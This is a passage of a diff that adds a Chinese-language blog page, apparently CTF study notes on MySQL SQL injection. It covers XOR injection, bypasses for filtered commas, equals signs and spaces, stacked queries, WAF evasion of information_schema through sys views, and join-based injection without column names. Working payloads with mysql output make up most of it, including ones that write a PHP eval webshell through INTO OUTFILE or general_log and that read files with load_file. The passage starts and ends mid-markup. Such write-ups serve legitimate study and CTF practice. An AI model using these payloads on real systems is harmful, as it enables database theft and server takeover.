sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag=1 union select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();</span><br><span class="line">+----------------+</span><br><span class="line">| flag           |</span><br><span class="line">+----------------+</span><br><span class="line">| 1              |</span><br><span class="line">| flag,flag,flag |</span><br><span class="line">+----------------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>无列名注入</li>
+</ul>
+<p>看一下下面的<code>payload</code>的就会懂的，原理比较简单</p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/25/ZZgHQU.md.png"><img src="ZZgHQU.md.png" alt="img"></a></p>
+<ul>
+<li>异或注入</li>
+</ul>
+<p>在<code>and,or ,|,&amp;&amp;,||</code>等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27;^(mid(user(),1,1)=&#x27;s&#x27;)^1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27;^(mid(user(),1,1)=&#x27;r&#x27;)^1;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>同等功能替换</li>
+</ul>
+<p>空格绕过：%0a,/**/.</p>
+<p>关键函数过滤：</p>
+<p>substr等价于left ,mid,substring</p>
+<p>group_concat等价于concat_ws</p>
+<ul>
+<li>逗号被过滤</li>
+</ul>
+<p>针对逗号被过滤的情况有三种，第一种情况是<code>union select</code> 中的逗号被过滤掉，第二种情况是<code>substr,mid</code>这类截取字符函数中的逗号被过滤掉，第三种是<code>limit 0,1</code>中的逗号被过滤。</p>
+<p><strong>union select 逗号被过滤掉</strong></p>
+<p>利用join注入，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; union select * from (select 1)a join (select 2)b;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 1    | 2            |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><strong>功能函数逗号被过滤</strong></p>
+<p>利用<code>from...for...</code>进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(mid((select user()) from 1 for 1)=&#x27;r&#x27;,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(mid((select user()) from 1 for 1)=&#x27;s&#x27;,1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><strong>limit中逗号被过滤</strong></p>
+<p>利用<code>limit..offset</code>进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">limit 9 offset 4`表示从第十行开始返回4行，返回的是`10,11,12,13</span><br><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema=database() limit 1 offset 0;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema=database() limit 1 offset 1;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| ctf_test   |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>等于号被过滤</strong></li>
+</ul>
+<p>可以用like,regexp,between…and..,rlike进行代替，用法如下：<br><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/ZZ7QC4.md.png"><img src="ZZ7QC4.md.png" alt="img"></a></p>
+<p>还有另外一种特殊的代替方法，利用<code>locate,position,instr</code>三种函数进行判断</p>
+<p>用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(locate(&#x27;ro&#x27;, substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(position(&#x27;ro&#x27; IN substring(user(),1,2))&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;2&#x27; and if(instr(substring(user(),1,2),&#x27;ro&#x27;)&gt;0,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>堆叠注入</strong></li>
+</ul>
+<p>例子：强网杯2019随便注</p>
+<p>payload如下形式</p>
+<p>查询字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;use information_schema;set @sql=concat(&#x27;s&#x27;,&#x27;elect column_name from columns wher&#x27;,&#x27;e table_name=&quot;1919810931114514&quot;&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>
+
+<p>查询内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;use supersqli;set @sql=concat(&#x27;s&#x27;,&#x27;elect `flag` from `1919810931114514`&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>load_file&amp;into outfile</strong></li>
+</ul>
+<p>这两个函数在sql注入中是影响比较大的两个函数，如果能成功利用，即可<code>getshell</code>和读取任意文件,但作用很大，同样限制条件也很多。</p>
+<p><strong>into outfile</strong></p>
+<p>1.首先要知道网站的绝对路径(可从报错或者phpinfo()中获得)</p>
+<p>2.拥有file权限</p>
+<p>3.secure_file_priv限制。通过<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;</code>查看信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv=null(不允许导入导出)</span><br><span class="line"></span><br><span class="line">mysqld --secure_file_priv=/tmp/(导入导出只允许在/tmp目录下)</span><br><span class="line"></span><br><span class="line">mysql  --secure_file_priv=(任意导入导出)</span><br></pre></td></tr></table></figure>
+
+<p><code>into outfile</code>有四种写入文件的方式</p>
+<p><strong>通过union注入写入文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 union select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;/var/lib/mysql-files/2.php&#x27;;</span><br><span class="line">Query OK, 2 rows affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/Ze50qf.md.png"><img src="Ze50qf.md.png" alt="img"></a></p>
+<p><strong>通过FIELDS TERMINATED BY写入文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 into outfile &#x27;/var/lib/mysql-files/3.php&#x27; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p><code>FIELDS TERMINATED BY</code>为在输出数据的字段中添加<code>FIELDS TERMINATED BY</code>的内容，如果字段数为1，则无法进行添加，也就是说这个的限制条件是起码要有两个字段的。</p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/ZeT9xA.md.png"><img src="ZeT9xA.md.png" alt="img"></a></p>
+<p>可以看到在一个字段的情况下无法添加我们的webshell。</p>
+<p><strong>通过LINES TERMINATED BY写入文件</strong></p>
+<p><code>LINES TERMINATED BY</code>为在每个记录后都添加设定添加的内容，不受字段数的限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 into outfile &#x27;/var/lib/mysql-files/3.php&#x27; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/ZeTbWQ.md.png"><img src="ZeTbWQ.md.png" alt="img"></a></p>
+<p><strong>LINES STARTING BY写入shell</strong></p>
+<p>用法与<code>LINES TERMINATED BY</code>一样，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 into outfile &#x27;/var/lib/mysql-files/4.php&#x27; lines starting by 0x3c3f70687020706870696e666f28293b3f3e;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p><strong>load_file</strong></p>
+<p>1.要求拥有file权限</p>
+<p>2.知道文件所在绝对路径</p>
+<p>3.同样受<code>secure_file_priv</code>限制</p>
+<p><strong>union注入进行load_file</strong></p>
+<p>效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 union select load_file(&#x27;/var/lib/mysql-files/4.php&#x27;);</span><br><span class="line">+----------------------+</span><br><span class="line">| flag                 |</span><br><span class="line">+----------------------+</span><br><span class="line">| 1                    |</span><br><span class="line">| &lt;?php phpinfo();?&gt;1</span><br><span class="line"> |</span><br><span class="line">+----------------------+</span><br><span class="line">2 rows in set, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用报错注入进行load_file</strong></p>
+<p>测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 and updatexml(1,concat(0x7e,(select load_file(&#x27;/var/lib/mysql-files/4.php&#x27;)),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~&lt;?php phpinfo();?&gt;1</span><br><span class="line">~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功得到文件内容</p>
+<p><strong>利用时间盲注进行load_file</strong></p>
+<p>测试如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=1 and if(mid((select load_file(&#x27;/var/lib/mysql-files/4.php&#x27;)),1,1)=&#x27;&lt;&#x27;,sleep(3),1);</span><br><span class="line">Empty set, 1 warning (3.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>成功延时3s，可配合脚本得到文件内容。</p>
+<p><strong>利用load_file扫描文件是否存在</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=&#x27;&#x27; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;/var/lib/mysql-files/4.php&#x27;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~0~&#x27;</span><br><span class="line">mysql&gt; select * from flag where flag=&#x27;&#x27; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;/var/lib/mysql-files/1.php&#x27;)),0x7e),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~1~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>is_null</code>函数的返回值来确定，如果是1的话代表文件不存在，如果是0的话文件存在。此方法可配合burp进行敏感文件的FUZZ。</p>
+<p><strong>另类写读文件</strong></p>
+<p><strong>dumpfile</strong> 官方文档如下：</p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/Zmk139.md.png"><img src="Zmk139.md.png" alt="img"></a></p>
+<p><strong>危险变量导致getshell</strong></p>
+<p>在我们可连接上被攻击数据库时，我们可以通过<code>select..into outfile..</code>进行写shell，但如果<code>secure_file_priv</code>为NULL且不可更改时，我们就无法通过这种形式去getshell。除了这种写shell的方式还有一种通过日志去写shell的方式，操作如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;; 查看配置信息</span><br><span class="line"></span><br><span class="line">set global general_log=on 开启general log模式</span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;F:\\phpstudy\\www\\shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_POST[&#x27;pwd&#x27;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>最终<code>shell.php</code>为我们的<code>webshell</code></p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/ZmGHSI.md.png"><img src="ZmGHSI.md.png" alt="img"></a></p>
+<p>组合拳思考</p>
+<p>我们在常规的注入中，流程应该就是查找数据库，查找表，查找字段，爆字段。</p>
+<p>其实利用上面的方法，我们可以做操作来绕过条件过滤。</p>
+<p>以<code>Sqli-lab less-1</code>为例</p>
+<p>首先通过<code>polygon</code>函数进行报错</p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/Zmuiy4.md.png"><img src="Zmuiy4.md.png" alt="img"></a></p>
+<p>接着通过列重复来报错</p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/ZmK8vF.md.png"><img src="ZmK8vF.md.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/ZmKyKe.md.png"><img src="ZmKyKe.md.png" alt="img"></a></p>
+<p>通过以上步骤可爆出<code>id,username,password</code>三个字段，最终爆出字段内容。</p>
+<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/06/26/ZmMzFI.md.png"><img src="ZmMzFI.md.png" alt="img"></a></p>
+<p>同理，order by盲注也比较有用，在列名以及小括号被过滤的情况下就比较适合。</p>
+<p>参考资料</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2460">https://xz.aliyun.com/t/2460</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a></p>
+<h1 id="Bypass-information-schema与无列名注入"><a href="#Bypass-information-schema与无列名注入" class="headerlink" title="Bypass information_schema与无列名注入"></a>Bypass information_schema与无列名注入</h1><h1 id="Bypass-information-schema"><a href="#Bypass-information-schema" class="headerlink" title="Bypass information_schema"></a>Bypass inf<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=orm">orm</a>ation_schema</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊一聊mysql在被waf禁掉了information_<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=schema">schema</a>库后还能有哪些利用思路，这个想法是前一段时间想到的，这次趁着安全客活动就在这里记录一下吧~</p>
+<blockquote>
+<p><strong>实验环境</strong><br>windows 2008 r2<br>phpstudy （mysql 5.7）<br>某waf（原因是<strong>该waf可以设置非法访问information_schema数据库</strong>）</p>
+</blockquote>
+<h2 id="前置任务"><a href="#前置任务" class="headerlink" title="前置任务"></a>前置任务</h2><p>进行bypass之前先了解一下mysql中的information_schma这个库是干嘛的，在SQL注入中它的作用是什么，那么有没有可以替代这个库的方法呢？</p>
+<p><strong>information_schema</strong></p>
+<blockquote>
+<p>简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p>
+</blockquote>
+<p> 在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。</p>
+<h2 id="MySQL5-7的新特性"><a href="#MySQL5-7的新特性" class="headerlink" title="MySQL5.7的新特性"></a>MySQL5.7的新特性</h2><p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了<code>sys schemma</code>，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p>
+<h3 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h3><p>开始了解这个视图之前，希望你可以想一下当你利用Mysql设计数据库时，是否会给每个表加一个<strong>自增的id（或其他名字）字段</strong>呢？如果是，那么我们发现了一个注入中在mysql默认情况下就可以替代information_schema库的方法。</p>
+<blockquote>
+<p><strong>schema_auto_increment_columns，该视图的作用简单来说就是用来对表自增ID的监控。</strong></p>
+</blockquote>
+<p> 这里我通过security（sqli-labs）和fortest（我自建库）两个库来熟悉一下schema_auto_increment_columns视图的结构组成，以及特性。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fortest库</span><br><span class="line">    data 表存在自增id</span><br><span class="line">    test 表存在自增id</span><br><span class="line">    no_a_i_table 表不存在自增id </span><br><span class="line">       </span><br><span class="line">security库</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span>该库为sqli<span class="operator">-</span>labs自动建立</span><br><span class="line">    emails,referers,uagents,users</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"><br>可以发现，fortest库中的no_a_i_table并不在这里存在，然而其他非系统库的表信息全部在这里。根据前面介绍的schema_auto_increment_columns视图的作用，也可以发现我们可以通过该视图获取数据库的表名信息，也就是说找到了一种可以替代information_schema在注入中的作用的方法。</p>
+<p>当然了，如果你说我们就是想想通过注入获取到没有自增主键的表的数据怎么办？通过翻阅sys中的视图文档，我又发现了两个视图也许可以实现这种需求？。</p>
+<h3 id="schema-table-statistics-with-buffer、x-schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer、x-schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer、x$schema_table_statistics_with_buffer"></a>schema_table_statistics_with_<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=buffer">buffer</a>、x$schema_table_statistics_with_buffer</h3><blockquote>
+<p><strong>查询表的统计信息</strong>，其中还包括InnoDB缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间（执行时间，即也可以理解为是存在最多表I/O争用的表）降序排序，<strong>数据来源：</strong><code>performance_schema.table_io_waits_summary_by_table</code>、<code>sys.x$ps_schema_table_statistics_io</code>、<code>sys.x$innodb_buffer_stats_by_table</code></p>
+</blockquote>
+<p> 通过介绍的内容我们可以很容易的发现，利用“数据来源”同样可以获取到我们需要的信息，所以说这样的话我们的绕过information_schema的思路就更广了。加下来依次看一下各个视图的结构：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">    可以看到，在上一个视图中并没有出现的表名在这里出现了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733941960.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942061.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在从`数据来源`中随便选取一个视图为例（想查看视图详细结构等信息可自行测试）</span><br><span class="line">sys.x$ps_schema_table_statistics_io</span><br><span class="line">可忽略table_name<span class="operator">=</span><span class="string">&#x27;db&#x27;</span>，默认的并非我创建。</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942062.png" alt="在这里插入图片描述"><br>类似的表还有：<a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mysql.innodb_table_stats</a>、mysql.innodb_table_index都存放有库名表名<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942063.png" alt="在这里插入图片描述"></p>
+<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p><strong>上面的方法的确可以获取数据库中表名信息了，但是并没有找到类似于information_schema中COLUMNS（字段）的视图，也就是说我们并不能获取数据？</strong> 当然不是。</p>
+<h2 id="利用join"><a href="#利用join" class="headerlink" title="利用join"></a>利用join</h2><p>这个思路在ctf中比较常见吧，利用join进行无列名注入，如何利用到这里就显而易见了。</p>
+<p><strong>join-using注列名：</strong></p>
+<p><strong>通过系统关键词join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因(相同列名存在)，而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</strong></p>
+<h3 id="join-…-using-xx"><a href="#join-…-using-xx" class="headerlink" title="join … using(xx)"></a>join … using(xx)</h3><p> 简单的记录一下payload吧。<strong>以本文开头的环境为例，这里的waf会完全过滤掉information_schema库。</strong></p>
+<blockquote>
+<p>由于开启防护后会拦截正常注入，所以图中payload可能会有些乱，我会将简单的payload整理在下面，绕过防护的部分完全可以自由发挥。</p>
+</blockquote>
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942064.png" alt="在这里插入图片描述"><br>爆表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schema_auto_increment_columns</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942065.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942066.png" alt="在这里插入图片描述"><br>其他的就不测试了，都是一个payload。</p>
+<p>获取字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取第一列的列名</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select * from (select * from users as a join users as b)as c--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942067.png" alt="在这里插入图片描述"><br><img src="20200609171704986.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">获取次列及后续列名</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select*from (select * from users as a join users b using(id,username))c--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span 